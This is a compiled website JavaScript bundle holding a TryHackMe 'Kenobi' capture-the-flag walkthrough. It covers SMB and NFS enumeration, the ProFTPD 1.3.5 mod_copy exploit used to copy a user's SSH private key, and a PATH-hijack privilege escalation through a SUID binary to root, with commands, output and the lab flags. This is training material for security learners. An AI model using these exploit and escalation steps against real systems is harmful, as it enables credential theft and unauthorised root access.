"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[4553],{3905:(e,n,t)=>{t.d(n,{Zo:()=>u,kt:()=>h});var r=t(67294);function o(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function a(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function i(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?a(Object(t),!0).forEach((function(n){o(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function s(e,n){if(null==e)return{};var t,r,o=function(e,n){if(null==e)return{};var t,r,o={},a=Object.keys(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||(o[t]=e[t]);return o}(e,n);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(o[t]=e[t])}return o}var l=r.createContext({}),p=function(e){var n=r.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):i(i({},n),e)),t},u=function(e){var n=p(e.components);return r.createElement(l.Provider,{value:n},e.children)},m="mdxType",c={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},d=r.forwardRef((function(e,n){var t=e.components,o=e.mdxType,a=e.originalType,l=e.parentName,u=s(e,["components","mdxType","originalType","parentName"]),m=p(t),d=o,h=m["".concat(l,".").concat(d)]||m[d]||c[d]||a;return t?r.createElement(h,i(i({ref:n},u),{},{components:t})):r.createElement(h,i({ref:n},u))}));function h(e,n){var t=arguments,o=n&&n.mdxType;if("string"==typeof e||o){var a=t.length,i=new Array(a);i[0]=d;var s={};for(var l in n)hasOwnProperty.call(n,l)&&(s[l]=n[l]);s.originalType=e,s[m]="string"==typeof e?e:o,i[1]=s;for(var p=2;p<a;p++)i[p]=t[p];return r.createElement.apply(null,i)}return r.createElement.apply(null,t)}d.displayName="MDXCreateElement"},91309:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>i,default:()=>c,frontMatter:()=>a,metadata:()=>s,toc:()=>p});var r=t(87462),o=(t(67294),t(3905));const a={},i="Kenobi",s={unversionedId:"Tryhackme/Kenobi/kenobi",id:"Tryhackme/Kenobi/kenobi",title:"Kenobi",description:"Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.",source:"@site/writeups/Tryhackme/Kenobi/kenobi.md",sourceDirName:"Tryhackme/Kenobi",slug:"/Tryhackme/Kenobi/",permalink:"/writeups/Tryhackme/Kenobi/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Kali Machine",permalink:"/writeups/Tryhackme/Kali Machine/"},next:{title:"kiba",permalink:"/writeups/Tryhackme/Kiba/"}},l={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Deploy the vulnerable machine",id:"deploy-the-vulnerable-machine",level:2},{value:"Enumerating Samba for shares",id:"enumerating-samba-for-shares",level:2},{value:"Gain initial access with ProFtpd",id:"gain-initial-access-with-proftpd",level:2},{value:"Privilege Escalation with Path Variable Manipulati",id:"privilege-escalation-with-path-variable-manipulati",level:2}],u={toc:p},m="wrapper";function c(e){let{components:n,...t}=e;return(0,o.kt)(m,(0,r.Z)({},u,t,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"kenobi"},"Kenobi"),(0,o.kt)("p",null,"Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation."),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/kenobi"},"Kenobi")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"SMB Enumeration"),(0,o.kt)("li",{parentName:"ul"},"SMB Exploitation"),(0,o.kt)("li",{parentName:"ul"},"Abusing SUID/GUID")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"deploy-the-vulnerable-machine"},"Deploy the vulnerable machine"),(0,o.kt)("p",null,"This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary."),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Make sure you're connected to our network and deploy the machine")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"Scan the machine with nmap, how many ports are open?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Kenobi$ sudo nmap -A -p- 10.10.137.113\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-03 19:52 CEST\nNmap scan report for 10.10.137.113\nHost is up (0.030s latency).\nNot shown: 65524 closed ports\nPORT      STATE SERVICE     VERSION\n21/tcp    open  ftp         ProFTPD 1.3.5\n22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)\n|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)\n|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)\n80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))\n| http-robots.txt: 1 disallowed entry\n|_/admin.html\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\n111/tcp   open  rpcbind     2-4 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  3,4          111/tcp6  rpcbind\n|   100000  3,4          111/udp6  rpcbind\n|   100003  2,3,4       2049/tcp   nfs\n|   100003  2,3,4       2049/tcp6  nfs\n|   100003  2,3,4       2049/udp   nfs\n|   100003  2,3,4       2049/udp6  nfs\n|   100005  1,2,3      37273/udp   mountd\n|   100005  1,2,3      46054/udp6  mountd\n|   100005  1,2,3      46885/tcp   mountd\n|   100005  1,2,3      57385/tcp6  mountd\n|   100021  1,3,4      35041/tcp   nlockmgr\n|   100021  1,3,4      43825/tcp6  nlockmgr\n|   100021  1,3,4      51338/udp   nlockmgr\n|   100021  1,3,4      59938/udp6  nlockmgr\n|   100227  2,3         2049/tcp   nfs_acl\n|   100227  2,3         2049/tcp6  nfs_acl\n|   100227  2,3         2049/udp   nfs_acl\n|_  100227  2,3         2049/udp6  nfs_acl\n139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)\n2049/tcp  open  nfs_acl     2-3 (RPC #100227)\n35041/tcp open  nlockmgr    1-4 (RPC #100021)\n37195/tcp open  mountd      1-3 (RPC #100005)\n45465/tcp open  mountd      1-3 (RPC #100005)\n46885/tcp open  mountd      1-3 (RPC #100005)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/3%OT=21%CT=1%CU=42921%PV=Y%DS=2%DC=T%G=Y%TM=5F78BA8\nOS:B%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS=8)OPS\nOS:(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST1\nOS:1NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN\nOS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: mean: 1h42m56s, deviation: 2h53m13s, median: 2m56s\n|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\n| smb-os-discovery:\n|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)\n|   Computer name: kenobi\n|   NetBIOS computer name: KENOBI\\x00\n|   Domain name: \\x00\n|   FQDN: kenobi\n|_  System time: 2020-10-03T12:56:10-05:00\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2020-10-03T17:56:10\n|_  start_date: N/A\n\nTRACEROUTE (using port 995/tcp)\nHOP RTT      ADDRESS\n1   28.42 ms 10.8.0.1\n2   28.79 ms 10.10.137.113\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 60.38 seconds\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"7")),(0,o.kt)("h2",{id:"enumerating-samba-for-shares"},"Enumerating Samba for shares"),(0,o.kt)("p",null,"Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often refereed to as a network file system."),(0,o.kt)("p",null,"Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network."),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Using nmap we can enumerate a machine for SMB shares. Nmap has the ability to run to automate a wide variety of networking tasks. There is a script to enumerate shares!")),(0,o.kt)("p",null,"SMB has two ports, 445 and 139."),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/bkgVNy3.png",alt:null})),(0,o.kt)("p",null,"Using the nmap command above, how many shares have been found?"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Kenobi$ sudo nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.137.113\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-03 19:55 CEST\nNmap scan report for 10.10.137.113\nHost is up (0.029s latency).\n\nPORT    STATE SERVICE\n445/tcp open  microsoft-ds\n\nHost script results:\n| smb-enum-shares:\n|   account_used: guest\n|   \\\\10.10.137.113\\IPC$:\n|     Type: STYPE_IPC_HIDDEN\n|     Comment: IPC Service (kenobi server (Samba, Ubuntu))\n|     Users: 1\n|     Max Users: <unlimited>\n|     Path: C:\\tmp\n|     Anonymous access: READ/WRITE\n|     Current user access: READ/WRITE\n|   \\\\10.10.137.113\\anonymous:\n|     Type: STYPE_DISKTREE\n|     Comment:\n|     Users: 0\n|     Max Users: <unlimited>\n|     Path: C:\\home\\kenobi\\share\n|     Anonymous access: READ/WRITE\n|     Current user access: READ/WRITE\n|   \\\\10.10.137.113\\print$:\n|     Type: STYPE_DISKTREE\n|     Comment: Printer Drivers\n|     Users: 0\n|     Max Users: <unlimited>\n|     Path: C:\\var\\lib\\samba\\printers\n|     Anonymous access: <none>\n|_    Current user access: <none>\n|_smb-enum-users: ERROR: Script execution failed (use -d to debug)\n\nNmap done: 1 IP address (1 host up) scanned in 5.66 seconds\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"3")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"On most distributions of Linux smbclient is already installed. Lets inspect one of the shares.")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"smbclient //10.10.137.113/anonymous")),(0,o.kt)("p",null,"Using your machine, connect to the machines network share."),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/B1FXBt8.png",alt:null})),(0,o.kt)("p",null,"Once you're connected, list the files on the share. What is the file can you see?"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Kenobi$ smbclient //10.10.137.113/anonymous\nEnter WORKGROUP\\kali\'s password:\nTry "help" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Wed Sep  4 12:49:09 2019\n  ..                                  D        0  Wed Sep  4 12:56:07 2019\n  log.txt                             N    12237  Wed Sep  4 12:49:09 2019\n\n                9204224 blocks of size 1024. 6877084 blocks available\nsmb: \\>\n')),(0,o.kt)("ol",{start:3},(0,o.kt)("li",{parentName:"ol"},"You can recursively download the SMB share too. Submit the username and password as nothing.")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"smbget -R smb://10.10.137.113/anonymous")),(0,o.kt)("p",null,"Open the file on the share. There is a few interesting things found."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"Information generated for Kenobi when generating an SSH key for the user\nInformation about the ProFTPD server.\n")),(0,o.kt)("p",null,"What port is FTP running on?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"21")),(0,o.kt)("ol",{start:4},(0,o.kt)("li",{parentName:"ol"},"Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just an server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve.")),(0,o.kt)("p",null,"In our case, port 111 is access to a network file system. Lets use nmap to enumerate this."),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.137.113")),(0,o.kt)("p",null,"What mount can we see?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"/var")),(0,o.kt)("h2",{id:"gain-initial-access-with-proftpd"},"Gain initial access with ProFtpd"),(0,o.kt)("p",null,"ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions."),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port. What is the version?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"21/tcp    open  ftp         ProFTPD 1.3.5\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"1.3.5")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"We can use searchsploit to find exploits for a particular software version. Searchsploit is basically just a command line search tool for exploit-db.com. How many exploits are there for the ProFTPd running?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Kenobi$ searchsploit ProFTPd\n------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                               |  Path\n------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nFreeBSD - 'ftpd / ProFTPd' Remote Command Execution                                                                                                          | freebsd/remote/18181.txt\nProFTPd - 'ftpdctl' 'pr_ctrls_connect' Local Overflow                                                                                                        | linux/local/394.c\nProFTPd - 'mod_mysql' Authentication Bypass                                                                                                                  | multiple/remote/8037.txt\nProFTPd - 'mod_sftp' Integer Overflow Denial of Service (PoC)                                                                                                | linux/dos/16129.txt\nProFTPd 1.2 - 'SIZE' Remote Denial of Service                                                                                                                | linux/dos/20536.java\nProFTPd 1.2 < 1.3.0 (Linux) - 'sreplace' Remote Buffer Overflow (Metasploit)                                                                                 | linux/remote/16852.rb\nProFTPd 1.2 pre1/pre2/pre3/pre4/pre5 - Remote Buffer Overflow (1)                                                                                            | linux/remote/19475.c\nProFTPd 1.2 pre1/pre2/pre3/pre4/pre5 - Remote Buffer Overflow (2)                                                                                            | linux/remote/19476.c\nProFTPd 1.2 pre6 - 'snprintf' Remote Root                                                                                                                    | linux/remote/19503.txt\nProFTPd 1.2.0 pre10 - Remote Denial of Service                                                                                                               | linux/dos/244.java\nProFTPd 1.2.0 rc2 - Memory Leakage                                                                                                                           | linux/dos/241.c\nProFTPd 1.2.10 - Remote Users Enumeration                                                                                                                    | linux/remote/581.c\nProFTPd 1.2.7 < 1.2.9rc2 - Remote Code Execution / Brute Force                                                                                               | linux/remote/110.c\nProFTPd 1.2.7/1.2.8 - '.ASCII' File Transfer Buffer Overrun                                                                                                  | linux/dos/23170.c\nProFTPd 1.2.9 RC1 - 'mod_sql' SQL Injection                                                                                                                  | linux/remote/43.pl\nProFTPd 1.2.9 rc2 - '.ASCII' File Remote Code Execution (1)                                                                                                  | linux/remote/107.c\nProFTPd 1.2.9 rc2 - '.ASCII' File Remote Code Execution (2)                                                                                                  | linux/remote/3021.txt\nProFTPd 1.2.x - 'STAT' Denial of Service                                                                                                                     | linux/dos/22079.sh\nProFTPd 1.3 - 'mod_sql' 'Username' SQL Injection                                                                                                             | multiple/remote/32798.pl\nProFTPd 1.3.0 (OpenSUSE) - 'mod_ctrls' Local Stack Overflow                                                                                                  | unix/local/10044.pl\nProFTPd 1.3.0 - 'sreplace' Remote Stack Overflow (Metasploit)                                                                                                | linux/remote/2856.pm\nProFTPd 1.3.0/1.3.0a - 'mod_ctrls' 'support' Local Buffer Overflow (1)                                                                                       | linux/local/3330.pl\nProFTPd 1.3.0/1.3.0a - 'mod_ctrls' 'support' Local Buffer Overflow (2)                                                                                       | linux/local/3333.pl\nProFTPd 1.3.0/1.3.0a - 'mod_ctrls' exec-shield Local Overflow                                                                                                | linux/local/3730.txt\nProFTPd 1.3.0a - 'mod_ctrls' 'support' Local Buffer Overflow (PoC)                                                                                           | linux/dos/2928.py\nProFTPd 1.3.2 rc3 < 1.3.3b (FreeBSD) - Telnet IAC Buffer Overflow (Metasploit)                                                                               | linux/remote/16878.rb\nProFTPd 1.3.2 rc3 < 1.3.3b (Linux) - Telnet IAC Buffer Overflow (Metasploit)                                                                                 | linux/remote/16851.rb\nProFTPd 1.3.3c - Compromised Source Backdoor Remote Code Execution                                                                                           | linux/remote/15662.txt\nProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                                    | linux/remote/37262.rb\nProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                                          | linux/remote/36803.py\nProFTPd 1.3.5 - File Copy                                                                                                                                    | linux/remote/36742.txt\nProFTPd 1.x - 'mod_tls' Remote Buffer Overflow                                                                                                               | linux/remote/4312.c\nProFTPd IAC 1.3.x - Remote Command Execution                                                                                                                 | linux/remote/15449.pl\nProFTPd-1.3.3c - Backdoor Command Execution (Metasploit)                                                                                                     | linux/remote/16921.rb\nWU-FTPD 2.4.2 / SCO Open Server 5.0.5 / ProFTPd 1.2 pre1 - 'realpath' Remote Buffer Overflow (1)                                                             | linux/remote/19086.c\nWU-FTPD 2.4.2 / SCO Open Server 5.0.5 / ProFTPd 1.2 pre1 - 'realpath' Remote Buffer Overflow (2)                                                             | linux/remote/19087.c\nWU-FTPD 2.4/2.5/2.6 / Trolltech ftpd 1.2 / ProFTPd 1.2 / BeroFTPD 1.3.4 FTP - glob Expansion                                                                 | linux/remote/20690.sh\n------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\nPapers: No Results\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"3")),(0,o.kt)("ol",{start:3},(0,o.kt)("li",{parentName:"ol"},"You should have found an exploit from ProFtpd's mod_copy module.")),(0,o.kt)("p",null,"The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination."),(0,o.kt)("p",null,"We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Kenobi$ nc 10.10.222.46 21\n220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.222.46]\nSITE CPFR /home/kenobi/.ssh/id_rsa\n350 File or directory exists, ready for destination name\nSITE CPTO /var/tmp/id_rsa\n250 Copy successful\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,o.kt)("ol",{start:5},(0,o.kt)("li",{parentName:"ol"},"Lets mount the /var/tmp directory to our machine")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"mkdir /mnt/kenobiNFS")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"sudo mount 10.10.222.46:/var /mnt/kenobiNFS")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"ls -la /mnt/kenobiNFS")),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/v8Ln4fu.png",alt:null})),(0,o.kt)("p",null,"We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account."),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/Vy4KkEl.png",alt:null})),(0,o.kt)("p",null,"What is Kenobi's user flag (/home/kenobi/user.txt)?"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Kenobi$ cp /mnt/kenobiNFS/tmp/id_rsa .\nkali@kali:~/CTFs/tryhackme/Kenobi$ chmod 600 id_rsa\nkali@kali:~/CTFs/tryhackme/Kenobi$ ssh -i id_rsa kenobi@10.10.222.46\nThe authenticity of host \'10.10.222.46 (10.10.222.46)\' can\'t be established.\nECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added \'10.10.222.46\' (ECDSA) to the list of known hosts.\nWelcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n103 packages can be updated.\n65 updates are security updates.\n\n\nLast login: Wed Sep  4 07:10:15 2019 from 192.168.1.147\nTo run a command as administrator (user "root"), use "sudo <command>".\nSee "man sudo_root" for details.\n\nkenobi@kenobi:~$ ls\nshare  user.txt\nkenobi@kenobi:~$ cat user.txt\nd0b0f3f53b6caa532a83915e19224899\nkenobi@kenobi:~$\n')),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"d0b0f3f53b6caa532a83915e19224899")),(0,o.kt)("h2",{id:"privilege-escalation-with-path-variable-manipulati"},"Privilege Escalation with Path Variable Manipulati"),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/LN2uOCJ.png",alt:null})),(0,o.kt)("p",null,"Lets first understand what what SUID, SGID and Sticky Bits are."),(0,o.kt)("table",null,(0,o.kt)("thead",{parentName:"table"},(0,o.kt)("tr",{parentName:"thead"},(0,o.kt)("th",{parentName:"tr",align:null},"Permission"),(0,o.kt)("th",{parentName:"tr",align:null},"On Files"),(0,o.kt)("th",{parentName:"tr",align:null},"On Directories"))),(0,o.kt)("tbody",{parentName:"table"},(0,o.kt)("tr",{parentName:"tbody"},(0,o.kt)("td",{parentName:"tr",align:null},"SUID Bit"),(0,o.kt)("td",{parentName:"tr",align:null},"User executes the file with permissions of the file owner"),(0,o.kt)("td",{parentName:"tr",align:null},"-")),(0,o.kt)("tr",{parentName:"tbody"},(0,o.kt)("td",{parentName:"tr",align:null},"SGID Bit"),(0,o.kt)("td",{parentName:"tr",align:null},"User executes the file with the permission of the group owner."),(0,o.kt)("td",{parentName:"tr",align:null},"File created in directory gets the same group owner.")),(0,o.kt)("tr",{parentName:"tbody"},(0,o.kt)("td",{parentName:"tr",align:null},"Sticky Bit"),(0,o.kt)("td",{parentName:"tr",align:null},"No meaning"),(0,o.kt)("td",{parentName:"tr",align:null},"Users are prevented from deleting files from other users.")))),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.")),(0,o.kt)("p",null,"To search the a system for these type of files run the following: ",(0,o.kt)("inlineCode",{parentName:"p"},"find / -perm -u=s -type f 2>/dev/null")),(0,o.kt)("p",null,"What file looks particularly out of the ordinary?"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null\n/sbin/mount.nfs\n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/snapd/snap-confine\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic\n/usr/bin/chfn\n/usr/bin/newgidmap\n/usr/bin/pkexec\n/usr/bin/passwd\n/usr/bin/newuidmap\n/usr/bin/gpasswd\n/usr/bin/menu\n/usr/bin/sudo\n/usr/bin/chsh\n/usr/bin/at\n/usr/bin/newgrp\n/bin/umount\n/bin/fusermount\n/bin/mount\n/bin/ping\n/bin/su\n/bin/ping6\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"/usr/bin/menu")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"Run the binary, how many options appear?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kenobi@kenobi:~$ /usr/bin/menu\n\n***************************************\n1. status check\n2. kernel version\n3. ifconfig\n** Enter your choice :\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"3")),(0,o.kt)("ol",{start:3},(0,o.kt)("li",{parentName:"ol"},"Strings is a command on Linux that looks for human readable strings on a binary.")),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/toHFALv.png",alt:null})),(0,o.kt)("p",null,"This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname)."),(0,o.kt)("p",null,"As this file runs as the root users privileges, we can manipulate our path gain a root shell."),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/OfMkDhW.png",alt:null})),(0,o.kt)("p",null,'We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!'),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'kenobi@kenobi:~$ cd /tmp/\nkenobi@kenobi:/tmp$ echo /bin/bash > curl\nkenobi@kenobi:/tmp$ chmod 777 curl\nkenobi@kenobi:/tmp$ export PATH=/tmp:$PATH\nkenobi@kenobi:/tmp$ /usr/bin/menu\n\n***************************************\n1. status check\n2. kernel version\n3. ifconfig\n** Enter your choice :1\nTo run a command as administrator (user "root"), use "sudo <command>".\nSee "man sudo_root" for details.\n\nroot@kenobi:/tmp# id\nuid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)\n')),(0,o.kt)("ol",{start:4},(0,o.kt)("li",{parentName:"ol"},"What is the root flag (/root/root.txt)?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"root@kenobi:/tmp# cat /root/root.txt\n177b3cd8562289f37382721c28381f02\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"177b3cd8562289f37382721c28381f02")))}c.isMDXComponent=!0}}]);